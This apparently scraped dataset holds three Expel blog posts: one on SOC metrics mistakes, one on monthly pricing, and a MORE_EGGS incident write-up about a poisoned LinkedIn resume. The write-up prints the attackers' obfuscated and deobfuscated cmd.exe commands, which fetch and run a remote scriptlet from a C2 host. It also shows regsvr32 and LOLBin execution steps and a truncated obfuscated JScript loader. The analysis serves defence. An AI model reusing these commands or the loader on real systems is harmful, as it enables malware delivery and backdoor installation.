  Example({'title': 'Mistakes to avoid when measuring SOC performance', 'url': 'https://expel.com/blog/mistakes-avoid-measuring-soc-performance/', 'date': 'Sep 27, 2017', 'contents': 'Subscribe  EXPEL BLOG Mistakes to avoid when measuring SOC performance Security operations  4 MIN READ  JUSTIN BAJKO  SEP 27, 2017  TAGS: Management / Metrics / SOC What gets measured gets managed. I heard this line repeated like a mantra early in my career whenever a new metrics program was being introduced in our security operations center (SOC). Unfortunately, nobody handed out magnifying glasses. That would have been helpful to read the six-point font metric-filled spreadsheet once it was printed out. We measured everything every manager could think to measure. The result? Our metrics improved but our outcomes didnt. For example, instead of taking the time to troubleshoot device outages when an associated ticket hadnt been updated in a week, employees started simply updating the tickets with lines that said, Device still not connected, and moving on because they were being measured on the number of tickets worked. And this is the problem when youre developing your first set of operational metrics. If youre not thoughtful about the things that you measure and why youre measuring them, you can end up managing to the wrong outcomes. So, why do companies get it wrong so frequently? Its not that theyre measuring the wrong things. Most often, companies are measuring the right thing, but theyre doing it in the wrong way or for the wrong reasons. Here are the three most common mistakes I see companies make when they start measuring their SOCs performance. 1. Counting all the things Lets start with these statements. Which do you think is better? We detected three more incidents this month! Success! vs. We had three fewer incidents this month! Success! How do you know what the right number is? More important, do you know why youre counting these things in the first place? Are you concerned that youre missing things? If so, it probably makes sense to focus on uncovering more incidents. If youre focused on making your organization more resilient to attacks and youve spent a lot of effort on prevention, then its reasonable to want to see a reduction in the total number of incidents. Either way, its important to realize that the outcome youre trying to achieve can change, so using a metric like this by itself and without context is rife with risk. Another popular metric is the aggregate number of alerts in Low, Medium, High, and Critical severity buckets. Lets face it, Critical is what gets all the airtime. But watch out for misaligned objectives when it comes to severity. Its easy to perceive more value as you find more super bad things But its easy for people to game the system when you look at things through this lens. Non-severe alerts start to get artificially dispositioned as critical and it can distract your team from real problems. Finally, counting things for the sake of counting things can be bad for your team. People dont like being measured for reasons they dont understand or on things they perceive to be wrong. And believe me, theyll know its wrong well before you do. If your team feels like theyre spending their time on the wrong things or being evaluated in the wrong way, theyll leave. 2. Faster is always better Speed is important when it comes to detecting and responding to threats. After all, if youre too slow, one compromised laptop can quickly spiral into an event where your most valuable data walks out the front door. But measuring people and processes based on speed alone can result in the wrong behavior. It can lead to quality issues  and yet again  drive people to game the system. Requiring your analysts to complete an investigation in 10 minutes sounds fine on the surface, but if you constrain an analysts ability to actually dig into an incident and find out whats really going on for the sake of time, youre likely to miss critical details and negatively impact your response to that incident. 3. More money, more tools! (or is it less money, fewer tools?) Everyone has a budget. And everyone gets measured on how they spend against that budget. Thats not going to change any time soon, and Im not advocating for it to change. However, spending less doesnt necessarily mean youre being a savvy spender. Likewise, spending more doesnt automatically make you more mature. Cutting costs in the wrong areas can create visibility issues, make you more vulnerable, and ultimately create a level of risk thats far greater than the business truly understands. To complicate matters, if your cost cutting decreases your visibility, thatll make it even harder to calculate risk for the business. But the flip side isnt exactly the promised land, either. Collecting all the latest cutting-edge security hotness that you heard about at RSA often does more harm than good. When you buy a new security tool, you need to have a plan for how youre going to use it: you need to understand what problem you have that this tool is supposed to solve, your team needs to know how to use it, and you guessed it, you need to know how youre going to measure its performance. Whats the impact of throwing money at cool new technology without understanding how it fits into your organization? Oddly enough, its similar to what happens when you try to cut costs without a plan  reduced visibility, increased vulnerability, and potentially increased risk to your environment. And dont forget: how budgets get spent and what products to buy next are decisions that are often heavily influenced by what youre measuring. If youre measuring the wrong things, you allocate resources incorrectly and the vicious cycle continues. So, what now? Okay. Ive spent a good bit of time talking about some of the most common mistakes that I see when organizations start to measure the performance of their SOC. Hopefully, Ive whet your appetite to hear about some of the innovative things Ive seen organizations do to effectively measure their SOCs performance. Stay tuned for our next post on this subject.'}) (input_keys={'title'}),
  Example({'title': 'Month-to-month pricing in uncertain times', 'url': 'https://expel.com/blog/month-to-month-pricing/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG Month-to-month pricing in uncertain times Security operations  1 MIN READ  MATT PETERS  APR 3, 2020 When we founded Expel nearly four years ago, we set out to provide our customers with greater peace of mind about security  whether theyre operating business as usual or facing more challenging circumstances. Theres plenty of uncertainty in our world right now, which is why were introducing a new way for new customers to get 247 security monitoring and response from us: monthly pricing for the first year. Starting today, you can sign up for Expel 247 monitoring, pay us monthly for the first year and give us 30 days notice if you need to cancel. Sound easy? Thats because it is. Whether you need some extra support while your security and IT teams go remote, want to focus on more urgent security priorities or just arent in a position to make an annual commitment  were committed to helping you quickly address your unique challenges in a way that works best for you. Youve probably got questions  We get it. Weve tried to keep things simple and, of course, transparent. How does this new pricing option work? In short, you pay for Expel service on a monthly basis (as opposed to an annual one) during the first year. If you want to cancel any time during the first year, just give us 30 days notice. After the first 12 months of service, the contract converts to an annual contract paid in advance. How much does it cost? When you choose an annual contract, its 15% less than the first-year-monthly pricing. You can see actual pricing on our pricing page . Why are you doing this? We know many orgs are facing difficult times. We want to help reduce anxiety. We think this can help: Organizations that need short-term coverage over the next few months Organizations with uncertain budgets that cant commit to a 12-month contract right now Organizations with new pandemic-related purchasing hurdles introduced into their buying processes, but want to get started right away Do I get the same service that customers on annual billing cycles are getting? Yep! The service is exactly the same. Anything else I should know? The pricing option is only available for contracts signed by September 30th, 2020. You can read the nitty gritty terms and conditions right here. Want to hear more? Wed love to talk with you. Send us a note!'}) (input_keys={'title'}),
  Example({'title': 'MORE_EGGS and Some LinkedIn Resum Spearphishing', 'url': 'https://expel.com/blog/more-eggs-and-some-linkedin-resume-spearphishing/', 'date': 'Aug 25, 2022', 'contents': 'Subscribe  EXPEL BLOG MORE_EGGS and Some LinkedIn Resum Spearphishing Security operations  14 MIN READ  KYLE PELLETT AND ANDREW JERRY  AUG 25, 2022  TAGS: MDR The Great Resignation has recruiters working overtime scouring LinkedIn resums for potential candidates. Unfortunately, some of these resums are posted by bad actors taking advantage of the situation. With a new twist on the MORE_EGGS family of malware, attackers are throwing their names in the ring by submitting poisoned resums to job recruiters . The Expel SOC recently spotted a deployment of this technique. The victims computer was infected and the malware payload tried to exfiltrate data within a few minutes. How we spotted our initial lead So, to be honest, malware sometimes acts so quickly that multiple alerts sound before one of our analysts can start the triage process. As youd imagine, were automatically suspicious when we see multiple alerts fire for the same activity. It tells us that something strange is happening. In this case, we received seven unique Microsoft Defender for Endpoint alerts within a few seconds for activity that clearly (for reasons explained below) resembled malicious code execution. This tipped our SOC analysts to an attack that was well under way  action to contain the host was needed urgently. After this type of malware gains initial access  even if partially blocked by existing security controls  the attack can spread quickly and deploy code execution , defense evasion , and command and control techniques (in this case the answer was D  all of the above). This is why a detection strategy that covers all parts of the MITRE ATT&amp;CK framework is so important. In this case, Defender for Endpoint caught the use of XSL Script Processing first. Cybersecurity is sometimes a battle of humans vs computers, and humans have the disadvantage with respect to time. A lot can happen in one computer second, and tech like the Expel Workbench and Ruxie help level the field by transforming alert data into intel our SOC analysts can quickly respond to while an attack is under way. (More on how we use Defenders features to our advantage here .) Lets take a look at one of several Microsoft Defender for Endpoint alerts we received, how the Expel Workbench helped guide our analysts to find important information quickly, and how we inferred that this attack was in progress. Can you spot the evil here? Heres what we saw in the recent process activity: We see regsvr32 attempting to execute 42981.ocx , which is similar to a technique used by malware (such as QBot and Lokibot ). This is a pretty good giveaway that some malicious code has been executed; its written this 42981.ocx file to disk, and has now called regsvr32 to run whatever code lies within this DLL file. The process arguments of cmd.exe are heavily obfuscated , an indication of an attacker trying to evade detection. One thing that isnt obfuscated is johndoe[.]com/kbvbskrvf , a likely suspect for a command and control IOC. This alert is looking for discovery activity or Suspicious sequence of exploration activities. We see this in the command cmd /v /c nltest /trusted_domains outputting to a text file in a temporary directory, which is consistent with identifying domains trusted by this host  quite unusual if you ask us. msxsl.exe is a deprecated XML parsing tool with a well documented use case for executing code and bypassing application controls  here we see it trying to run an obscurely named text file. We also observe wmic creating the process ie4uinit.exe -basesettings . This is another LOLBAS (living off the land binary, script, or library) like msxsl.exe that can easily execute code because it can execute commands from a specially prepared ie4uinit.inf file. Okay, so a lot of bad stuff going onand so far, not a lot of answers to how this happened. At this point, we declared an incident, notified our customer, and sent them remediation actions to contain the host and block communications with johndoe[.]com (Side note: This is not the real C2 we observed, but in the interest of protecting the anonymity of the user the attackers impersonated, we refer to them as johndoe for this blog.) Identifying the root cause The next question we wanted to answer: How did this malware infection get here? We used the customers EDR tool to review the timeline and walk back through the chain of events that ultimately led us to an event involving Outlook.exe. OUTLOOK.EXE opened the http link hxxps://www.linkedin[.]com/e/v2?e=-1swgqb-l437ev7b-v3&amp;lipi=urn%3Ali%3Apage%3Aemail_email_jobs_new_applicant_01%3Bgo6DX7fyT96rJM8b2IE8Fw%3D%3D&amp;t=plh&amp;ek=email_jobs_new_applicant_01&amp;li=0&amp;m=email_jobs_new_applicant&amp;ts=job_posting_download_resume&amp;urlhash=quvr&amp;url=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ftalent%2Fapi%2FtalentResumes%3FapplicationId%3D10266114276%26tokenId%3D2155098668%26checkSum%3DAQGkxf8BsoxNsmZdzes9P0qm-HMeqGo9oXk The user clicked on a link in an email from a legitimate sender to a legitimate domain; based on the requested resource, it appears they were seeking a resum for a job posting. This is interesting for a couple of reasons. The attackers evaded inbox malspam detection using a legitimate email sender The document is likely expected, based on a job posting created by the targeted user The link in the email also appears legitimate Unfortunately, our target still fell prey to a malicious phishing document. So what happens if the victim clicks through to download the resum from LinkedIn? To find out, we followed the trail and discovered a PDF crafted to present the viewer with an error. The error is actually an attempt to lure the victim to an unsafe site where they can download General-Manager-resum.docx (the file is presented as a Word document). Of course, this is suspicious to us because we know what happens. But an everyday user recruiting from LinkedIn has probably seen resums that arent compatible with their software. This seems to be what the attackers are counting on. Notably, the domain johndoe[.]com aligns with what the recruiter expects to see based on the applicants name. (It was later discovered that the victim was in fact a recruiter and wasnt aware of a problem with their host after following this funnel.) What happened to the host? So what happens when the user clicks on the .docx link? Well, as it turns out, a bunch of things (before the user is finally presented with a word document). First of all, the file that lands on the victims disk is actually a zip archive by the same name  General Manager Resume 1.zip. Once the zip is written to disk, we immediately see it create John Doe CV.lnk. At this point we see a familiar code execution from one of our alerts: Obfuscated "cmd.exe" /v /c set "979113wEX=set" &amp;&amp; call set "979113gn=%979113wEX:~0,1%" &amp;&amp; (for %p in (c) do @set "979113QCH=%~p") &amp;&amp; !979113gn!et "979113XI=e" &amp;&amp; !979113gn!!979113XI!t "979113rKw=$w" &amp;&amp; s!979113XI!t "979113bCj=i" &amp;&amp; set "979113FL=a" &amp;&amp; s!979113XI!t "979113jnI=t" &amp;&amp; !979113gn!et "979113pHq=d" &amp;&amp; s!979113XI!t "979113mJ=." &amp;&amp; s!979113XI!t "979113MAn=init" &amp;&amp; set "979113TQ=s!979113bCj!" &amp;&amp; s!979113XI!t "979113Jq=s!979113XI!tt!979113bCj!ngs" &amp;&amp; s!979113XI!t "979113Pnd=.!979113bCj!nf" &amp;&amp; set "979113PN=i!979113XI!u!979113MAn!!979113Pnd!" &amp;&amp; s!979113XI!t "979113ED= = " &amp;&amp; !979113gn!et "979113AS=s!979113bCj!gnatur!979113XI!!979113ED!" &amp;&amp; s!979113XI!t "979113vY=all!979113mJ!win" &amp;&amp; set "979113ixY=de" &amp;&amp; s!979113XI!t "979113Dtp=ch" &amp;&amp; call !979113gn!!979113XI!t "979113YM=C:Users&lt;Redacted&gt;AppDataRoamingM!979113bCj!crosoft" &amp;&amp; s!979113XI!t "979113nT=!979113YM!!979113PN!" &amp;&amp; set "979113of="^" &amp;&amp; (for %h in ("[vers!979113bCj!on]" "!979113AS!!979113rKw!!979113bCj!ndows nt$" "[!979113ixY!stinationdirs]" "F00BE!979113ED!01" "[!979113ixY!faultinst!979113vY!dows7]" "UnRegist!979113XI!rOCXs!979113ED!3DF1" "!979113pHq!elfiles!979113XI!F00BE" "[3DF1]" "%11%scRo%979113yd%j,NI,%979113RHZ%%979113BCS%%979113BCS%p%979113zL%%979113rf%%979113rf%johndoe.com/kbvbskrvf" "[F00BE]" "ieu%979113GjL%!979113Pnd!" "[strings]" "979113GjL=!979113MAn!" "979113BCS=t" "servicename\' \'" "979113RHZ=h" "979113zL=:" "979113rf=/" "shorthvcname= " "979113FPK=com" "979113yd=b") do @e!979113Dtp!o %~h)&gt;"!979113nT!" &amp;&amp; set "979113jgm=ie4uinit.exe" &amp;&amp; call copy /Y C:windowssystem32!979113jgm! "!979113YM!" &gt; nul &amp;&amp; st!979113FL!rt "" /MIN wm!979113bCj!c proc!979113XI!ss call cr!979113XI!ate "!979113YM!!979113jgm! -bas!979113XI!!979113Jq!" Deobfuscated "cmd.exe" /v /c (for h in ("[version]" "signature = $windows nt$" "[destinationdirs]" " 01 = 01" "[defaultinstall.windows7]" "UnRegisterOCXs = 3DF1" "delfileseF00BE" "[3DF1]" "11scRobj,NI,http://johndoe.com/kbvbskrvf" "[F00BE]" "ieuinit.inf" "[strings]" "init=init" "t=t" "servicename\' \'" "h=h" ":=:" "/=/" "shorthvcname= " "979113FPK=com" "b=b") do @echo ~h)&gt;"C:Users&lt;Redacted&gt;AppDataRoamingMicrosoft.infieuinit.inf" &amp;&amp; set "ie4uinit.exe=ie4uinit.exe" &amp;&amp; call copy /Y C:windowssystem32ie4uinit.exe "C:Users&lt;Redacted&gt;AppDataRoamingMicrosoft" &gt; nul &amp;&amp; stirt "" /MIN wmic process call create "C:Users&lt;Redacted&gt;AppDataRoamingMicrosoftie4uinit.exe -basesettings" This command accomplishes a few things. It: points to http://johndoe[.]com/kbvbskrvf, a malicious resource hosted on the C2 domains UnRegisterOCXs to fetch and run the malicious resource using scrobj writes it as the file ieuinit.inf and puts it in C:Users&lt;Redacted&gt;AppDataRoamingMicrosoft.infieuinit.inf copies the legitimate ie4uinit.exe from C:windowssystem32ie4uinit.exe and uses WMIC to create the process in C:Users&lt;Redacted&gt;AppDataRoamingMicrosoftie4uinit.exe This is indicative of the fileless malware execution technique used by GANDCAB, described here . (Further credit to the BOHOPS description of misuse of .inf files, UnRegisterOCXSection and scrobj.dll .) Whenever we see legitimate Windows binaries where no vendors have determined the hash for ie4uinit.exe to be malicious, their occurrence outside the normal/expected path raises suspicions. According to VirusTotal , the file isnt signed, but appears to be copywritten by Microsoft and is a component of Internet Explorer. Within a millisecond of execution of the obfuscated cmd.exe process, we see the following wmic process. wmic process call create "C:Users&lt;Redacted&gt;AppDataRoamingMicrosoftie4uinit.exe -basesettings" Another signed binary, msxsl.exe , is also placed in the AppdataRoaming directory. The attackers now have two signed binaries at their disposal in an unprotected location: C:Users&lt;Redacted&gt;AppDataRoamingMicrosoftmsxsl.exe. Both ieuninit.exe and msxsl.exe were placed in AppdataRoaming for later use. All of this happened in seconds while the victim was waiting for the resum to load  and we see one more command before the victim is presented with a Word doc  the decoy resum). The signed binary is in an unusual location  C:Users&lt;Redacted&gt;AppDataRoamingMicrosoftie4uinit.exe  and is using wmic to adjust token privileges to allow the following privileges to the users access token: Shutdown, Undock, IncreaseWorkingSet, TimeZone. This was followed by the execution of a script by ie4uinit.exe out of AppDataRomaing. The following AMSI content was recorded. See Appendix A : At first glance, this looks like an obfuscated javascript with function calls containing the following human-readable operations: return String.fromCharCode return new ActiveXObject return Math.floor(Math.random() * 65536 .writeText .saveToFile {if (typeof WScript === object) {return true; RegRead GetObject .Create Without completely deobfuscating this, we can guess the intent is to run a function after obfuscating the data with String.fromCharCode. This works by naming hexadecimal values as Unicode values, which are finally converted to characters. Heres the slightly deobfuscated pretty version: See Appendix B : The script then takes the string and writes an ActiveXobject with whats expected to be a WScript file: lgnsyjcm9801.saveToFile(lgnsyjcm4315); lgnsyjcm9801.close(); lgnsyjcm963 = 1; } catch (lgnsyjcm265) { return 0; } return lgnsyjcm963; } function lgnsyjcm400() { try { lgnsyjcm0147.lgnsyjcm786; return true; } catch (lgnsyjcm27) { if (typeof WScript === "object") { We then see an attempt at some cryptographic function based on the presence of return Math.floor(Math.random() * 65536 . Open-source intelligence suggests this function is generating a pseudo-random number either used for C2 traffic encryption or as a GUID to uniquely identify the machine for eventual extortion or ransomware reasons. Theres also evidence of an intended registry-read event: function lgnsyjcm206() { var lgnsyjcm681; var lgnsyjcm4718; try { lgnsyjcm681 = lgnsyjcm15(lgnsyjcm2656("EdT:2)?+6**kP&gt;Yj", lgnsyjcm8, lgnsyjcm4)); lgnsyjcm4718 = lgnsyjcm681.RegRead(lgnsyjcm2656("rz%I07urKoW0mJVbfPQ=}Kp;]cNjAFcRVlW#ckgw7%I&gt;(,I5,dv&amp;KR/,^kH+9*p=/6*dFQ+mC2T|j[,;T)+FE", lgnsyjcm8, lgnsyjcm4)); if (!lgnsyjcm4718) { return false; } This can be deobfuscated further, but the next event we see on the host is the decoy document being created and executed using wmi: Script content: IWshShell3.Environment("PROCESS"); IWshEnvironment.Item("APPDATA"); _Stream.Open(); _Stream.Position("0"); _Stream.Type("2"); _Stream.Charset("437"); _Stream.WriteText(""); _Stream.SaveToFile("C:Users&lt;Redacted&gt;AppDataRoamingMicrosoft6222.doc"); The user is now presented with a Word document, and nothing appears unusual. Thanks to AMSI content, we can see the 6222.doc file was executed and an ocx file is created. Script Content: IWshShell3.Environment("PROCESS"); IWshEnvironment.Item("APPDATA"); _Stream.Open(); _Stream.Position("0"); _Stream.Type("2"); _Stream.Charset("437"); _Stream.WriteText(""); _Stream.SaveToFile("C:Users&lt;Redacted&gt;AppDataRoamingMicrosoft6222.doc"); _Stream.Close(); IWshShell3.RegRead("HKLMSOFTWAREMicrosoftWindowsCurrentVersionApp PathsWinword.exe"); ISWbemServicesEx.Get("Win32_Process"); ISWbemObjectEx._01000001("C:Program FilesMicrosoft OfficeRootOffice16WIN", "Unsupported parameter type 00000001", "Unsupported parameter type 00000001", "0"); _Stream.Open(); _Stream.Position("0"); _Stream.Type("2"); _Stream.Charset("437"); _Stream.WriteText("MZ"); _Stream.SaveToFile("C:Users&lt;Redacted&gt;AppDataRoamingMicrosoft42981.ocx") 42981.ocx is now executed by regsrv32.exe, a common tactic used by malicious Word document authors. Script Content: Win32_Process.GetObject(); SetPropValue.CommandLine("C:Program FilesMicrosoft OfficeRootOffice16WINWORD.EXE "C:Users&lt;Redacted&gt;AppDataRoamingMicrosoft6222.doc""); SetPropValue.CurrentDirectory("Unsupported parameter type 00000001"); SetPropValue.ProcessStartupInformation("Unsupported parameter type 00000001"); Win32_Process.ExecMethod(Create); Win32_Process.GetObject(); SetPropValue.CommandLine("regsvr32 /s /n /i:Login "C:Users&lt;Redacted&gt;AppDataRoamingMicrosoft42981.ocx""); After executing the .ocx file with regsvr32 we see a registry modification that appears to be a text file in the AppData directory. While we dont have the contents of the text file, we can assume this is a persistence mechanism. "Registry Key: S-1-12-1-3569878806-1151277312-3324287152-3804517278Environment Value Name: UserInitMprLogonScript Value Data: cscripT -e:jsCript ""%APPDATA%Microsoft46BA2C64FFD9F546.txt"" Value Type: RegistryValueEntity" Regsvr32 also launches the msxsl.exe dropped by the malware to execute the file FC22A0E0F890CC.txt. "Script Content: Win32_Process.GetObject(); SetPropValue.CommandLine(""C:Users&lt;Redacted&gt;AppDataRoamingMicrosoftmsxsl.exe FC22A0E0F890CC.txt FC22A0E0F890CC.txt""); After this we see evidence of discovery commands being executed via wmi by the parent process msxsl.exe. Without the contents of the .txt file we cant really know for sure whats happening. But based on OSINT, we can speculate that the .txt file is the MORE_EGGS JScript because it behaves like MORE_EGGS. If youre wondering why we didnt do further analysis  good question. We were hindered a bit without file acquisition and were limited to host timelines. MSDFE did a pretty good job of recording. msxsl.exe executed the WMI query \'SELECT Version FROM CIM_Datafile Where Name = \'C:\\windows\\notepad.exe\'\' msxsl.exe executed the WMI query \'SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True\' msxsl.exe executed the WMI query \'SELECT * FROM Win32_Process\' typeperf.exe "SystemProcessor Queue Length" -si 180 -sc 1 Following some system discovery activity, we see HTTP POSTs to the C2 domain webdirectoryuk[.]com. See Appendix C . The wmi process then executes the cmd.exe command under the victims user context to run the nltest command to identify trusted domains and write the output to a text file. This was the final action performed by the malware prior to host containment. cmd /v /c nltest /trusted_domains &gt; "C:Users&lt;Redacted&gt;AppDataLocalTemp55337.txt" 2&gt;&amp;1 Based on open source intelligence research, we suspect 55337.txt is the MORE_EGGS backdoor. This blog explains the capability of this backdoor, which includes command execution via cmd.exe /C among other functionality: Command Description d&amp;exec Download and execute an executable (.exe or .dll). more_eggs Delete the current More_eggs and replace it. Gtfo Uninstall activity. more_onion Execute a script. via_c Run a command using cmd.exe /C. Unfortunately, we were unable to acquire any of the files we described. However, given the behaviors performed on the host we were able to tell the story of how a LinkedIn resum phishing document resulted in a MORE_EGGS backdoor. Even without acquiring the file, our analysis of the activity aligns with the financially motivated cybercrime gangs FIN6, Evilnum, or the Cobalt Group. Its difficult to attribute activity to a specific group, but we saw LinkedIn used in 2021 to deliver MORE_EGGS  with one key difference. The first iteration of threat groups harnessing LinkedIn for this purpose was an inverse of the victim-attacker relationship. Instead of recruiters expecting resums, the FIN6 group was posing as employers and sending fake job offers to their victims over LinkedIn. Based on their prior use of LinkedIn, its quite possible this is the work of FIN6 or a copycat. Either way, credit should be given where due. Financially motivated threat actors arent playing around and the victim user this article was based around wasnt aware that downloading a resums from LinkedIn left a backdoor on their machine. Summary of attack lifecycle: Remediation: Initial remediation focused on stopping the bleeding, containing the host, and reimaging the box to a known good image, ensuring no remnants were left over. We also recommended blocking the C2 domain webdirectoryuk[.]com. Resilience: Even though we detected and reported this incident quickly, the bottom line is that malicious code executed on one of our customer-managed devices on their network. Whenever we can directly point to environment controls to enable defenders or disrupt attackers, we include them in the incident findings report. In this incident we provided the customer with the following resilience actions: Disrupt attackers: Phishing education for users, specifically from trusted sources (LinkedIn). Configure Jscript (.js, .jse), Windows Scripting Files (.wsf, .wsh) and HTML for application (.hta) files to open with Notepad. By associating these file extensions with Notepad you mitigate common remote code execution techniques. Note that PowerShell files (.ps1) already open by default in Notepad. Enable Defenders: Increase visibility into PowerShell activity by taking advantage of logging capabilities. Module and ScriptBlock logging provide greater visibility into potential PowerShell attacks. Good: Ensure PowerShell 3.0 (at least) is installed on all Windows systems and enable PowerShell Module logging. Better: Ensure PowerShell 5.0 (at least) is installed on all Windows systems and enable PowerShell ScriptBlock logging and transcription logging. Best: Ensure PowerShell 5.0 (at least) is installed on all Windows systems, enable PowerShell ScriptBlock logging and transcription logging; also make sure Microsoft-Windows-PowerShell%4Operational.evtx is at least 1 GB in size on all systems to aid in an investigation. Appendix A Script content: function anonymous() { function lgnsyjcm9469(lgnsyjcm2900) {return lgnsyjcm2900.length;}function lgnsyjcm262(lgnsyjcm6080){return String.fromCharCode(lgnsyjcm6080);}function lgnsyjcm56(lgnsyjcm458) {var lgnsyjcm62 = [];var lgnsyjcm356 = [];var lgnsyjcm144 = "";var lgnsyjcm1495;var lgnsyjcm020;var lgnsyjcm4110 = 0;lgnsyjcm62[0x80] = 0x00C7;lgnsyjcm62[0x81] = 0x00FC;lgnsyjcm62[0x82] = 0x00E9;lgnsyjcm62[0x83] = 0x00E2;lgnsyjcm62[0x84] = 0x00E4;lgnsyjcm62[0x85] = 0x00E0;lgnsyjcm62[0x86] = 0x00E5;lgnsyjcm62[0x87] = 0x00E7;lgnsyjcm62[0x88] = 0x00EA;lgnsyjcm62[0x89] = 0x00EB;lgnsyjcm62[0x8A] = 0x00E8;lgnsyjcm62[0x8B] = 0x00EF;lgnsyjcm62[0x8C] = 0x00EE;lgnsyjcm62[0x8D] = 0x00EC;lgnsyjcm62[0x8E] = 0x00C4;lgnsyjcm62[0x8F] = 0x00C5;lgnsyjcm62[0x90] = 0x00C9;lgnsyjcm62[0x91] = 0x00E6;lgnsyjcm62[0x92] = 0x00C6;lgnsyjcm62[0x93] = 0x00F4;lgnsyjcm62[0x94] = 0x00F6;lgnsyjcm62[0x95] = 0x00F2;lgnsyjcm62[0x96] = 0x00FB;lgnsyjcm62[0x97] = 0x00F9;lgnsyjcm62[0x98] = 0x00FF;lgnsyjcm62[0x99] = 0x00D6;lgnsyjcm62[0x9A] = 0x00DC;lgnsyjcm62[0x9B] = 0x00A2;lgnsyjcm62[0x9C] = 0x00A3;lgnsyjcm62[0x9D] = 0x00A5;lgnsyjcm62[0x9E] = 0x20A7;lgnsyjcm62[0x9F] = 0x0192;lgnsyjcm62[0xA0] = 0x00E1;lgnsyjcm62[0xA1] = 0x00ED;lgnsyjcm62[0xA2] = 0x00F3;lgnsyjcm62[0xA3] = 0x00FA;lgnsyjcm62[0xA4] = 0x00F1;lgnsyjcm62[0xA5] = 0x00D1;lgnsyjcm62[0xA6] = 0x00AA;lgnsyjcm62[0xA7] = 0x00BA;lgnsyjcm62[0xA8] = 0x00BF;lgnsyjcm62[0xA9] = 0x2310;lgnsyjcm62[0xAA] = 0x00AC;lgnsyjcm62[0xAB] = 0x00BD;lgnsyjcm62[0xAC] = 0x00BC;lgnsyjcm62[0xAD] = 0x00A1;lgnsyjcm62[0xAE] = 0x00AB;lgnsyjcm62[0xAF] = 0x00BB;lgnsyjcm62[0xB0] = 0x2591;lgnsyjcm62[0xB1] = 0x2592;lgnsyjcm62[0xB2] = 0x2593;lgnsyjcm62[0xB3] = 0x2502;lgnsyjcm62[0xB4] = 0x2524;lgnsyjcm62[0xB5] = 0x2561;lgnsyjcm62[0xB6] = 0x2562;lgnsyjcm62[0xB7] = 0x2556;lgnsyjcm62[0xB8] = 0x2555;lgnsyjcm62[0xB9] = 0x2563;lgnsyjcm62[0xBA] = 0x2551;lgnsyjcm62[0xBB] = 0x2557;lgnsyjcm62[0xBC] = 0x255D;lgnsyjcm62[0xBD] = 0x255C;lgnsyjcm62[0xBE] = 0x255B;lgnsyjcm62[0xBF] = 0x2510;lgnsyjcm62[0xC0] = 0x2514;lgnsyjcm62[0xC1] = 0x2534;lgnsyjcm62[0xC2] = 0x252C;lgnsyjcm62[0xC3] = 0x251C;lgnsyjcm62[0xC4] = 0x2500;lgnsyjcm62[0xC5] = 0x253C;lgnsyjcm62[0xC6] = 0x255E;lgnsyjcm62[0xC7] = 0x255F;lgnsyjcm62[0xC8] = 0x255A;lgnsyjcm62[0xC9] = 0x2554;lgnsyjcm62[0xCA] = 0x2569;lgnsyjcm62[0xCB] = 0x2566;lgnsyjcm62[0xCC] = 0x2560;lgnsyjcm62[0xCD] = 0x2550;lgnsyjcm62[0xCE] = 0x256C;lgnsyjcm62[0xCF] = 0x2567;lgnsyjcm62[0xD0] = 0x2568;lgnsyjcm62[0xD1] = 0x2564;lgnsyjcm62[0xD2] = 0x2565;lgnsyjcm62[0xD3] = 0x2559;lgnsyjcm62[0xD4] = 0x2558;lgnsyjcm62[0xD5] = 0x2552;lgnsyjcm62[0xD6] = 0x2553;lgnsyjcm62[0xD7] = 0x256B;lgnsyjcm62[0xD8] = 0x256A;lgnsyjcm62[0xD9] = 0x2518;lgnsyjcm62[0xDA] = 0x250C;lgnsyjcm62[0xDB] = 0x2588;lgnsyjcm62[0xDC] = 0x2584;lgnsyjcm62[0xDD] = 0x258C;lgnsyjcm62[0xDE] = 0x2590;lgnsyjcm62[0xDF] = 0x2580;lgnsyjcm62[0xE0] = 0x03B1;lgnsyjcm62[0xE1] = 0x00DF;lgnsyjcm62[0xE2] = 0x0393;lgnsyjcm62[0xE3] = 0x03C0;lgnsyjcm62[0xE4] = 0x03A3;lgnsyjcm62[0xE5] = 0x03C3;lgnsyjcm62[0xE6] = 0x00B5;lgnsyjcm62[0xE7] = 0x03C4;lgnsyjcm62[0xE8] = 0x03A6;lgnsyjcm62[0xE9] = 0x0398;lgnsyjcm62[0xEA] = 0x03A9;lgnsyjcm62[0xEB] = 0x03B4;lgnsyjcm62[0xEC] = 0x221E;lgnsyjcm62[0xED] = 0x03C6;lgnsyjcm62[0xEE] = 0x03B5;lgnsyjcm62[0xEF] = 0x2229;lgnsyjcm62[0xF0] = 0x2261;lgnsyjcm62[0xF1] = 0x00B1;lgnsyjcm62[0xF2] = 0x2265;lgnsyjcm62[0xF3] = 0x2264;lgnsyjcm62[0xF4] = 0x2320;lgnsyjcm62[0xF5] = 0x2321;lgnsyjcm62[0xF6] = 0x00F7;lgnsyjcm62[0xF7] = 0x2248;lgnsyjcm62[0xF8] = 0x00B0;lgnsyjcm62[0xF9] = 0x2219;lgnsyjcm62[0xFA] = 0x00B7;lgnsyjcm62[0xFB] = 0x221A;lgnsyjcm62[0xFC] = 0x207F;lgnsyjcm62[0xFD] = 0x00B2;lgnsyjcm62[0xFE] = 0x25A0;lgnsyjcm62[0xFF] = 0x00A0;do {lgnsyjcm1495 = lgnsyjcm458[lgnsyjcm4110];if (lgnsyjcm1495 &lt; 128) {lgnsyjcm020 = lgnsyjcm1495;}else {lgnsyjcm020 = lgnsyjcm62[lgnsyjcm1495];}lgnsyjcm356.push(lgnsyjcm262(lgnsyjcm020));lgnsyjcm4110 += 1;} while (lgnsyjcm4110 &lt; lgnsyjcm9469(lgnsyjcm458));lgnsyjcm144 = lgnsyjcm356.join("");return lgnsyjcm144;}function lgnsyjcm15(lgnsyjcm287) {return new ActiveXObject(lgnsyjcm287);}function lgnsyjcm7522() {return Math.floor(Math.random() * 65536);}function lgnsyjcm4677(lgnsyjcm387, lgnsyjcm4315, lgnsyjcm7403, lgnsyjcm1632, lgnsyjcm4299){var lgnsyjcm963;try {var lgnsyjcm5310 = lgnsyjcm598(lgnsyjcm387);var lgnsyjcm081 = lgnsyjcm894(lgnsyjcm5310, lgnsyjcm7403, lgnsyjcm1632);lgnsyjcm5310 = 0;if (lgnsyjcm4299 === 1 &amp;&amp; lgnsyjcm081[0] !== 0x4D &amp;&amp; lgnsyjcm081[1] !== 0x5a){return 0;}var lgnsyjcm9801 = 